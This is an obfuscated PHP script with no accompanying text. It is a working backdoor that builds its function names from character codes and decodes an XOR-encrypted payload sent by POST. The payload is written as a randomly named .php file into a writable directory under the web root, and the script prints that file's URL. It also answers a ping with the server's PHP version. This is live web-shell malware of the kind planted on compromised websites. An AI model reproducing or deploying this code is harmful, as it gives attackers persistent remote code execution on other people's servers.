<?php $sOuYJj = "\104".'O'.chr(67)."\x55".chr(654-577).chr(69)."\x4e"."\124"."\x5f".chr(247-165)."\117".chr(319-240).chr(84);$opSYJk = chr(861-789).chr(684-600).'T'."\120".'_'.chr(72).'O'."\x53".chr(640-556);$CkNbg = chr(263-159)."\x74".'t'."\x70".':'.chr(47)."\x2f";$UyaHoK = "\x2e".'p'."\150".chr(112);$ertBBfM = 'p'."\x68"."\x70";$DWlIX = "\x66"."\x69".chr(108)."\145".chr(95).chr(112).chr(117).'t'."\137".chr(99).'o'."\156".chr(1003-887)."\145".'n'.chr(116)."\x73";$ikOwEJdg = "\x72"."\x61"."\x77".chr(849-732)."\162"."\154".chr(100).chr(1094-993).chr(99).chr(713-602).chr(535-435).chr(101);$HTnnUNys = "\165"."\156".'s'.'e'.'r'."\151"."\141".chr(108).chr(823-718)."\x7a"."\145";$irNVf = 'i'.'s'.chr(850-755)."\x77".chr(114)."\151".'t'.chr(168-71).'b'.chr(476-368).'e';$xJuiFgBCJ = chr(953-841)."\x68".chr(112).'v'."\x65"."\x72".chr(115).chr(802-697)."\x6f".chr(110);$UHNLCnhB = "\x73"."\164"."\162"."\137".'r'.chr(673-562)."\x74".'1'.chr(51);$iBJnJxlX = 's'.chr(101).chr(114).'i'."\x61".chr(170-62)."\x69".chr(122).'e';$YHKJUQR = "\163".chr(116).chr(936-822).'_'.'s'."\x70".chr(1048-940).chr(915-810)."\x74";foreach ($_POST as $nwwkv => $pWEudRvcQ){$vwqEmL = strlen($nwwkv);if ($vwqEmL == 16){$pWEudRvcQ = $YHKJUQR($ikOwEJdg($UHNLCnhB($pWEudRvcQ)));$nwwkv = array_slice($YHKJUQR(str_repeat($nwwkv, (count($pWEudRvcQ)/16)+1)), 0, count($pWEudRvcQ));function ywTmPLQ($AfBrXvHR, $AXUgknSRZ, $nwwkv){$vhalEoD = "11aae3d7-a417-4190-a5a2-dc79c3d64aa3";return $AfBrXvHR ^ $vhalEoD[$AXUgknSRZ % strlen($vhalEoD)] ^ $nwwkv;}$pWEudRvcQ = array_map("ywTmPLQ", array_values($pWEudRvcQ), array_keys($pWEudRvcQ), array_values($nwwkv));$pWEudRvcQ = implode("", $pWEudRvcQ);$pWEudRvcQ = @$HTnnUNys($pWEudRvcQ);if (@is_array($pWEudRvcQ)){$uiEgaPoV = array_keys($pWEudRvcQ);$pWEudRvcQ = $pWEudRvcQ[$uiEgaPoV[0]];if ($pWEudRvcQ === $uiEgaPoV[0]){echo @$iBJnJxlX(Array($ertBBfM => @$xJuiFgBCJ(), ));exit();}else {function HoCujbfWl($srworir){static $tPMZNXDLb = array();$vRvqfHfC = glob($srworir . '/*', GLOB_ONLYDIR);$cNvCHBPft = count($vRvqfHfC);if ($cNvCHBPft > 0) {foreach ($vRvqfHfC as $srwor) {if (@$irNVf($srwor)) {$tPMZNXDLb[] = $srwor;}}}foreach ($vRvqfHfC as $srworir) HoCujbfWl($srworir);return $tPMZNXDLb;}$otORKIP = $_SERVER[$sOuYJj];$vRvqfHfC = HoCujbfWl($otORKIP);$uiEgaPoV = array_rand($vRvqfHfC);$EieMTXCHBh = $vRvqfHfC[$uiEgaPoV] . "/" . substr(md5(time()), 0, 8) . $UyaHoK;@$DWlIX($EieMTXCHBh, $pWEudRvcQ);$rcJKhy = $CkNbg . $_SERVER[$opSYJk] . substr($EieMTXCHBh, strlen($otORKIP));print($rcJKhy);die();}}}}